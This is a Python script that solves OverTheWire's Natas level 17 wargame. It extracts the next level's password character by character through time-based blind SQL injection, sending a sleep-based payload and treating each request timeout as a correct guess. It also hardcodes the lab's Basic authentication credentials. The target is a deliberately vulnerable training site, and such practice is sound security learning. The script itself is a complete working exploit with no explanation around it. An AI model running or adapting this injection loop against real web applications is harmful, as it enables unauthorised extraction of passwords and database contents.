import requests

headers = {'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}

url = 'http://natas17.natas.labs.overthewire.org/index.php'

password = ''

for c in range(1,33): #loop for each character in the password (32 characters long)
    for i in range(33,127): #loop for each possible ascii character (33-126 are non-whitespace pw allowable chrs)
        payload = '?username=natas18"+and+if(ascii(substr(password,{},1))={},sleep(10),"a")--+'.format(c, i)

        try: 
            r = requests.post(url+payload, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            password+=chr(i)
            print(chr(i), end='', flush=True)
            break